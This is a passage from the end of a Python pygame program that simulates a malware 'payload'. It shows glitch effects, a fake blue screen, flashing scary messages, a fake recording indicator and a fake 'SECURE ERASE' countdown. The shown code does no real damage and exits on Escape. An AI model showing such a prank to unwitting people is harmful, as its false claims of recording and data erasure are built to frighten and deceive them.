        bx, by = x + w - 18, y + 3
        pygame.draw.rect(self.screen, (192, 192, 192), (bx, by, 16, 16))
        pygame.draw.rect(self.screen, (255, 255, 255), (bx, by, 16, 16), 1)
        pygame.draw.rect(self.screen, (128, 128, 128), (bx + 1, by + 15, 15, 1))
        pygame.draw.rect(self.screen, (128, 128, 128), (bx + 15, by + 1, 1, 15))
        self.screen.blit(self.font_popup_title.render("X", True, (0, 0, 0)), (bx + 3, by + 1))
        pygame.draw.circle(self.screen, (255, 0, 0), (x + 32, y + 75), 16)
        self.screen.blit(self.font_popup_title.render("!", True, (255, 255, 255)), (x + 29, y + 65))
        for i, line in enumerate(body.split('\n')):
            self.screen.blit(self.font_popup.render(line, True, (0, 0, 0)), (x + 58, y + 42 + i * 18))
        bw    = self.font_popup.size(btn_label)[0] + 16
        btn_x = x + (w - bw) // 2
        btn_y = y + h - 36
        pygame.draw.rect(self.screen, (192, 192, 192), (btn_x, btn_y, bw, 22))
        pygame.draw.rect(self.screen, (255, 255, 255), (btn_x,     btn_y,      bw, 22), 1)
        pygame.draw.rect(self.screen, (128, 128, 128), (btn_x + 1, btn_y + 21, bw - 1, 1))
        pygame.draw.rect(self.screen, (128, 128, 128), (btn_x + bw - 1, btn_y + 1, 1, 21))
        self.screen.blit(self.font_popup.render(btn_label, True, (0, 0, 0)), (btn_x + 8, btn_y + 4))

    # ── Scary message overlay ──────────────────────────────────────────────────
    def _update_scary_message(self):
        if self.scary_msg:
            if self.frame_count - self.scary_msg_frame >= self.scary_msg_duration:
                self.scary_msg    = None
                self.scary_msg_cd = random.randint(70, 200)
        elif self.scary_msg_cd > 0:
            self.scary_msg_cd -= 1
        else:
            self.scary_msg       = random.choice(SCARY_MESSAGES)
            self.scary_msg_frame = self.frame_count

    def _draw_scary_message(self):
        if not self.scary_msg:
            return
        frames_shown = self.frame_count - self.scary_msg_frame
        # Instant on, fade out at the end
        alpha = 255 if frames_shown < self.scary_msg_duration - 12 else max(
            0, int(255 * (self.scary_msg_duration - frames_shown) / 12)
        )
        text_surf = self.font_scary.render(self.scary_msg, True, (255, 255, 255))
        tw, th    = text_surf.get_size()
        tx        = (self.width  - tw) // 2
        ty        = (self.height - th) // 2

        # Dark red band
        band = pygame.Surface((self.width, th + 36), pygame.SRCALPHA)
        band.fill((120, 0, 0, min(210, alpha)))
        self.screen.blit(band, (0, ty - 18))

        # Red accent lines
        pygame.draw.line(self.screen, (255, 0, 0), (0, ty - 19),       (self.width, ty - 19),       2)
        pygame.draw.line(self.screen, (255, 0, 0), (0, ty + th + 17),  (self.width, ty + th + 17),  2)

        text_surf.set_alpha(alpha)
        self.screen.blit(text_surf, (tx, ty))

    # ── HUD overlays ──────────────────────────────────────────────────────────
    def _draw_rec_indicator(self):
        """Blinking ● REC — implies the screen is being recorded."""
        if (self.frame_count // 20) % 2 == 0:
            pygame.draw.circle(self.screen, (220, 0, 0),   (18, 18), 7)
            pygame.draw.circle(self.screen, (255, 80, 80), (18, 18), 4)
        self.screen.blit(self.font_hud.render("REC", True, (220, 0, 0)), (30, 10))

    def _draw_countdown(self, elapsed_ms):
        """Fake 'SECURE ERASE IN' timer counting down from 5 minutes."""
        remaining = max(0, self.countdown_ms - elapsed_ms)
        mins      = remaining // 60000
        secs      = (remaining % 60000) // 1000
        text      = f"SECURE ERASE IN  {mins:02d}:{secs:02d}"
        blink     = remaining < 60000 and (self.frame_count // 15) % 2 == 0
        color     = (255, 50, 50) if blink else (200, 60, 60)
        surf      = self.font_hud.render(text, True, color)
        x         = self.width - surf.get_width() - 18
        self.screen.blit(self.font_hud.render(text, True, (0, 0, 0)), (x + 1, 12))
        self.screen.blit(surf, (x, 11))

    # ── Main loop ──────────────────────────────────────────────────────────────
    def run(self):
        while self.running:
            current_ticks    = pygame.time.get_ticks()
            self.frame_count += 1
            self.flash_cycle  = (self.flash_cycle + 1) % 30

            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    self.running = False
                if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                    self.running = False
                if self.state == "desktop" and event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
                    if self.icon_rect.collidepoint(event.pos):
                        dt = current_ticks - self.last_click_time
                        if dt < DOUBLE_CLICK_TIME:
                            self.state       = "payload"
                            self.start_ticks = pygame.time.get_ticks()
                        else:
                            self.last_click_time = current_ticks

            if self.state == "boot":
                self.draw_boot_screen()

            elif self.state == "desktop":
                self.draw_desktop_icon()

            elif self.state == "payload":
                elapsed               = current_ticks - self.start_ticks
                phase_num             = elapsed // PHASE_DURATION
                self.elapsed_in_phase = elapsed - phase_num * PHASE_DURATION
                phase                 = self.get_current_phase(elapsed)

                # Seed tunnel_frame from work_surface on the first frame of the tunnel phase
                if phase == "tunnel" and self.prev_phase != "tunnel":
                    self.tunnel_frame.blit(self.work_surface, (0, 0))
                self.prev_phase = phase

                if   phase == "scroll":     self.effect_scroll()
                elif phase == "melt":       self.effect_melt()
                elif phase == "matrix":     self.effect_matrix()
                elif phase == "chromatic":  self.effect_chromatic()
                elif phase == "wave":       self.effect_wave()
                elif phase == "duplicate":  self.effect_duplicate()
                elif phase == "terminal":   self.effect_terminal()
                elif phase == "static":     self.effect_static()
                elif phase == "tunnel":     self.effect_tunnel()
                elif phase == "chaos":      self.effect_chaos()
                elif phase == "bsod":       self.effect_bsod()
                elif phase == "recovery":   self.effect_recovery()
                elif phase == "exit":       self.effect_exit()

                # Scary message flashes during tense phases
                if phase in self.scary_msg_phases:
                    self._update_scary_message()
                    self._draw_scary_message()

                # HUD — hidden during BSOD (it has its own full-screen design)
                if phase != "bsod":
                    self._draw_rec_indicator()
                    self._draw_countdown(elapsed)

                if (self.frame_count % SURFACE_UPDATE_INTERVAL == 0
                        and phase not in {"tunnel", "terminal", "chromatic", "matrix", "bsod"}):
                    self.work_surface.blit(self.screen, (0, 0))

            pygame.display.flip()
            self.clock.tick(FPS)

        self.cleanup()

    def cleanup(self):
        try:
            pygame.quit()
        except Exception as e:
            print(f"Error during cleanup: {e}")
        finally:
            sys.exit()


if __name__ == "__main__":
    sim = FullHydrogenSimulation()
    sim.run()
